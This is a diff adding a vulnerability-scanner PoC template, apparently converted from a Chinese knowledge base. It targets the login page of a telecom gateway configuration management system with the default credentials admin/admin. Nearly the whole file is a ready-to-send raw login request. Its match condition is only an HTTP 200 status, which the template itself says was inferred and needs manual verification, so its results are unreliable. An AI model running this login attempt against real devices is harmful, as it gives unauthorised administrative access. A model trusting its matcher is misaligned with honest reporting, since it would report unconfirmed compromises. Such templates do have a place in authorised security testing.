@@ -1,0 +1,43 @@
+id: poc-d0d2ce6082f4df6b2745
+info:
+  name: 电信网关配置管理系统存在弱口令漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d0d2ce6082f4df6b2745dfdef4697b40
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: default-login,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d0d2ce6082f4df6b2745dfdef4697b40
+http:
+- raw:
+  - 'POST /manager/login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Upgrade-Insecure-Requests: 1
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=tskslsm160gbfc5o8uskotr8i3
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Cache-Control: max-age=0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Length: 21
+
+
+    Name=admin&Pass=admin'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
